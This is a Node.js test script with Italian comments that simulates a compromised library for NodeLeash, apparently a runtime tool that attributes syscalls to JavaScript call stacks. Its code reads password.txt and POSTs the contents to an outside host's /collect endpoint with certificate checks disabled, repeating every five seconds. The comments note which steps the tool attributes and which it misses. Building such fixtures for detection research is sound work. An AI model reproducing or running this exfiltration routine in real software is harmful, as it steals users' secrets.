const fs = require('fs');
const https = require('https');
const dns = require('dns');

function mainLogic() {
    console.log("Eseguo logica di business...");
    businessLogic();
}

function businessLogic() {
    console.log("L'applicazione sta funzionando correttamente");
    maliciousLibrary();
}

// funzione infetta
function maliciousLibrary() {
    stealSecrets();
}

function stealSecrets() {
    const targetFile = 'password.txt';

    // STEP 1: lettura file — thread pool → uv__fs_work
    // Category A: uv__work_submit cattura lo stack JS qui (stealSecrets visibile)
    // poi uv__fs_work trasferisce il contesto al worker thread
    // → NodeLeash ATTRIBUISCE a maliciousLibrary/stealSecrets
    fs.readFile(targetFile, 'utf8', function onRead(err, data) {
        if (err) {
            console.error(`[ERRORE] ${err.message}`);
            return;
        }

        console.log(`[SUCCESSO] Letto ${targetFile}, avvio esfiltrazione...`);
        exfiltrateData(data);
    });
}

function exfiltrateData(secretData) {
    const exfilServer = 'google.com';
    const payload = JSON.stringify({ stolen: secretData, pid: process.pid });

    // STEP 2: DNS lookup — thread pool → uv__getaddrinfo_work
    // Category A: uv__work_submit cattura lo stack JS qui (exfiltrateData visibile)
    // → NodeLeash ATTRIBUISCE a maliciousLibrary/exfiltrateData
    dns.lookup(exfilServer, function onDnsResolved(err, address) {
        if (err) {
            console.error(`[DNS ERR] ${err.message}`);
            return;
        }

        console.log(`[DNS] ${exfilServer} → ${address}`);

        // STEP 3: TCP connect + HTTP POST
        // connect() → sincrono, stack visibile: NodeLeash ATTRIBUISCE
        // writev() → quasi sempre EAGAIN su primo invio:
        //   al momento del syscall lo stack è event loop internals
        //   (nessun uprobe Category B implementato)
        //   → NodeLeash NON ATTRIBUISCE (finisce in UnattributedPolicy)
        const options = {
            hostname: address,
            port: 443,
            path: '/collect',
            method: 'POST',
            rejectUnauthorized: false,
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload),
            },
        };

        const req = https.request(options, function onResponse(res) {
            console.log(`[ESFILTRAZIONE] Server risponde: ${res.statusCode}`);
        });

        req.on('error', function onError(e) {
            console.error(`[ESFILTRAZIONE ERR] ${e.message}`);
        });

        // Invio payload — uv_write → potenziale EAGAIN → writev deferred
        req.write(payload);
        req.end();
    });
}

// Avvio
setInterval(mainLogic, 5000);
console.log(`PID: ${process.pid}`);
console.log("In attesa... (Premi Ctrl+C per terminare)");